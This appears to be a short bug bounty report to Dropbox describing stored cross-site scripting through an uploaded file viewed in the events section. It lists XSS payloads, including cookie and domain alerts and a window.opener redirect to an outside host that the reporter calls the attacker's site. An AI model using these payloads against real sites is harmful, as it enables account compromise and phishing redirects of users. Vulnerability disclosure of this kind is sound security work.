Summary:

Hi,

This bug might interest you.

In the process of testing , I uploaded a file which contained the scripts:

<script>
window.opener.location.replace('http://blackhorse.x10host.com/test.php');
</script>
<img src='2' onerror= "alert('XSS')" >
<svg/onload=prompt(123);> 
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>

On opening of the uploaded file through the events section, the XSS pop-ups come up and also the Dropbox user is redirected to the attackers site.

One can share the link of the uploaded file with another dropbox user,once he adds it to its account and views it,his account can be compromised.

Kindly please refer to the video attached.

Thanks and Regards
Nishant
